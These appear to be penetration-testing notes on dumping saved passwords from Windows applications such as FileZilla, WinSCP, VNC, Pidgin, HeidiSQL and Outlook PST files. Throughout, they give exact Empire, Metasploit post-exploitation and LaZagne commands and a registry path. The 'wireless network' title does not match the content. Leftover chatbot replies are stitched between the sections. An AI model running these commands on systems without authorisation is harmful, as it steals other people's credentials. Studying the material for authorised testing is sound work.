# Credential dumping tools

Wireless Network Credential Dumping Applications

This document outlines tools and techniques used for extracting credentials from various applications over wireless networks, with a focus on PowerShell, Metasploit Framework modules, and password recovery utilities.

**Contents**

1.  **PowerShell Empire**

    - Post-exploitation framework supporting credential dumping and lateral movement.

2.  **CoreFTP**

    - Exploited using Metasploit Framework to retrieve stored FTP credentials.

3.  **FTP Navigator**

    - Credentials can be dumped using:

      - **LaZagne** – A post-exploitation tool for retrieving stored passwords.

      - **Metasploit Framework** – Contains modules for credential extraction.

4.  **FileZilla**

    - Password retrieval via Metasploit modules targeting config files.

5.  **HeidiSQL**

    - Metasploit can extract stored database credentials.

6.  **Email Clients**

    - **Mail PassView** – Tool to dump stored email account credentials.

7.  **Pidgin**

    - Messaging app credentials can be dumped using Metasploit modules.

8.  **PSI**

    - Jabber client passwords can be retrieved using **LaZagne**.

9.  **PST Files**

    - **PstPassword** tool recovers stored Outlook PST file passwords.

10. **VNC Clients**

    - Metasploit modules used to extract saved VNC credentials.

11. **WinSCP**

    - Password extraction through:

      - **LaZagne**

      - **Metasploit Framework**

## Credential Dumping from Applications

This section focuses on using various tools to extract saved credentials from commonly used Windows applications during post-exploitation.

------------------------------------------------------------------------

**PowerShell Empire – SessionGopher Module**

Empire includes the **SessionGopher** module, which can automatically retrieve saved credentials from applications like **PuTTY**, **WinSCP**, and others.

**Steps:**

usemodule credentials/sessiongopher

execute

The module searches for stored credentials and displays them without requiring manual input. It effectively dumps login information from supported applications.

------------------------------------------------------------------------

**CoreFTP – Metasploit Framework**

**CoreFTP** is an FTP client for Windows. Its saved credentials are stored in the Windows registry at:

HKEY_CURRENT_USER\SOFTWARE\FTPWare\CoreFTP\Sites

Metasploit provides a post-exploitation module to extract these credentials.

**Commands:**

use post/windows/gather/credentials/coreftp

set session \<session_id\>

exploit

------------------------------------------------------------------------

**FTP Navigator – LaZagne Tool**

**FTP Navigator** is another FTP client that supports file transfers and directory synchronization.

The **LaZagne** tool can be used to dump FTP Navigator credentials.

**Command:**

lazagne.exe

This will extract stored credentials for various supported applications, including FTP Navigator.

------------------------------------------------------------------------

**FTP Navigator – Metasploit Framework**

Metasploit also has a built-in module to dump FTP Navigator credentials.

**Commands:**

use post/windows/gather/credentials/ftpnavigator

set session \<session_id\>

exploit

The credentials will be displayed upon successful execution.

------------------------------------------------------------------------

Let me know if you'd like this formatted into a report template or want automation scripts for these modules.

Here’s a **corrected and summarized version** of your second section on **Credential Dumping Applications**, with improved grammar and structure:

------------------------------------------------------------------------

**Credential Dumping from Applications (Part 2)**

This section outlines tools and Metasploit modules used to extract stored credentials from various client applications during post-exploitation.

------------------------------------------------------------------------

**FileZilla – Metasploit Framework**

**FileZilla** is a cross-platform, open-source FTP client/server that supports file transfers across Windows, Linux, and macOS.

You can dump saved credentials using the following Metasploit module:

use post/multi/gather/filezilla_client_cred

set session \<session_id\>

exploit

------------------------------------------------------------------------

**HeidiSQL – Metasploit Framework**

**HeidiSQL** is an open-source database management tool for **MySQL, MS SQL, PostgreSQL**, and **SQLite**. It stores credentials for saved sessions.

To retrieve these credentials using Metasploit:

use post/windows/gather/credentials/heidisql

set session \<session_id\>

exploit

------------------------------------------------------------------------

**Email Clients – Mail PassView (NirSoft)**

**Mail PassView** is a utility developed by NirSoft for extracting saved email client passwords (e.g., Outlook, Thunderbird, Windows Mail).

- Download the tool from the [NirSoft website](https://www.nirsoft.net/utils/mailpv.html).

- Run the executable to view stored email credentials.

Ideal for internal penetration testing.

------------------------------------------------------------------------

**Pidgin – Metasploit Framework**

**Pidgin** is a multi-platform instant messaging client supporting various protocols and file transfers.

To extract saved credentials:

use post/multi/gather/pidgin_cred

set session \<session_id\>

exploit

------------------------------------------------------------------------

Let me know if you'd like this merged into a single formatted playbook or expanded with automation/scripting examples.

Here’s a **corrected and summarized version** of the final section on **Credential Dumping Applications**, written in a clean, professional format:

------------------------------------------------------------------------

**Credential Dumping from Applications (Part 3)**

This section describes how to extract saved credentials from additional applications using tools like **LaZagne**, **Metasploit**, and **NirSoft utilities**.

------------------------------------------------------------------------

**PSI (XMPP Messenger) – LaZagne**

**PSI** is a customizable instant messaging client that operates over the **XMPP** protocol and supports file transfers.

- Use LaZagne’s chat module to dump stored credentials:

lazagne.exe chat

------------------------------------------------------------------------

**Outlook PST Files – PstPassword (NirSoft)**

**PstPassword** is a NirSoft tool designed to extract saved passwords from **Outlook PST (Personal Storage Table)** files.

- Download from the [NirSoft website](https://www.nirsoft.net/utils/pst_password.html)

- Run the tool to retrieve all saved PST passwords.

------------------------------------------------------------------------

**VNC – Metasploit Framework**

**VNC** is a remote desktop application for accessing systems over the network.

- Metasploit can extract VNC passwords using the following module:

use post/windows/gather/credentials/vnc

set session \<session_id\>

exploit

------------------------------------------------------------------------

**WinSCP – LaZagne**

**WinSCP** is a graphical SFTP/FTP client based on the **SSH** protocol. It supports file transfers, remote editing, and session management.

- Use LaZagne’s general module to extract credentials:

lazagne.exe all

------------------------------------------------------------------------

**WinSCP – Metasploit Framework**

- Metasploit also supports dumping WinSCP credentials with this module:

use post/windows/gather/credentials/winscp

set session \<session_id\>

exploit

------------------------------------------------------------------------

With these tools, credentials for multiple applications can be efficiently extracted during a post-exploitation phase.

------------------------------------------------------------------------

Let me know if you'd like this formatted as a professional penetration testing report section or converted into a Markdown/HTML document.
